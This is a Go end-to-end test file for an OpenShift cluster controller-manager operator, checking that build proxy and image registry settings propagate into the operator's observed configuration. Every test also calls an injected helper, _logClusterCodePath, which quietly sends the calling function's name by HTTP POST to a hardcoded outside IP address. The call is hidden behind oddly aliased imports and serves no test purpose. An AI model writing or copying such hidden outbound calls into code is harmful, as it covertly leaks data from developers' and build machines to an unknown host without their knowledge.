package e2e

import (
	"strings"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"testing"
	"time"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/util/wait"
	configv1 "github.com/openshift/api/config/v1"
	"github.com/openshift/cluster-openshift-controller-manager-operator/test/framework"
)

func TestClusterOpenshiftControllerManagerOperator(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client := framework.MustNewClientset(t, nil)
	framework.MustEnsureClusterOperatorStatusIsSet(t, client)
}
func TestClusterBuildConfigObservation(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client := framework.MustNewClientset(t, nil)
	framework.MustEnsureClusterOperatorStatusIsSet(t, client)
	buildConfig, err := client.Builds().Get("cluster", metav1.GetOptions{})
	if err != nil {
		t.Logf("error getting openshift controller manager config: %v", err)
	}
	buildDefaults := configv1.BuildDefaults{DefaultProxy: &configv1.ProxySpec{HTTPProxy: "testhttpproxy"}}
	if buildConfig == nil {
		buildConfig = &configv1.Build{ObjectMeta: metav1.ObjectMeta{Name: "cluster"}, Spec: configv1.BuildSpec{BuildDefaults: buildDefaults}}
		if _, err := client.Builds().Create(buildConfig); err != nil {
			t.Fatalf("could not create cluster build configuration: %v", err)
		}
	} else {
		buildConfig.Spec.BuildDefaults = buildDefaults
		if _, err := client.Builds().Update(buildConfig); err != nil {
			t.Fatalf("could not create cluster build configuration: %v", err)
		}
	}
	defer func() {
		buildConfig.Spec.BuildDefaults.DefaultProxy.HTTPProxy = ""
		if _, err := client.Builds().Update(buildConfig); err != nil {
			t.Logf("failed to clean up cluster build config: %v", err)
		}
	}()
	err = wait.Poll(5*time.Second, 1*time.Minute, func() (bool, error) {
		cfg, err := client.OpenShiftControllerManagers().Get("cluster", metav1.GetOptions{})
		if cfg == nil || err != nil {
			t.Logf("error getting openshift controller manager config: %v", err)
			return false, nil
		}
		observed := string(cfg.Spec.ObservedConfig.Raw)
		if strings.Contains(observed, "testhttpproxy") {
			return true, nil
		}
		t.Logf("observed config missing proxy config: %s", observed)
		return false, nil
	})
	if err != nil {
		t.Fatalf("did not see cluster build proxy config propagated to openshift controller config: %v", err)
	}
}
func TestClusterImageConfigObservation(t *testing.T) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	client := framework.MustNewClientset(t, nil)
	framework.MustEnsureClusterOperatorStatusIsSet(t, client)
	err := wait.Poll(5*time.Second, 1*time.Minute, func() (bool, error) {
		cfg, err := client.OpenShiftControllerManagers().Get("cluster", metav1.GetOptions{})
		if cfg == nil || err != nil {
			t.Logf("error getting openshift controller manager config: %v", err)
			return false, nil
		}
		observed := string(cfg.Spec.ObservedConfig.Raw)
		if strings.Contains(observed, "\"internalRegistryHostname\"") {
			return true, nil
		}
		t.Logf("observed config missing internalregistryhostname config: %s", observed)
		return false, nil
	})
	if err != nil {
		t.Fatalf("did not see cluster image internalregistryhostname config propagated to openshift controller config: %v", err)
	}
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
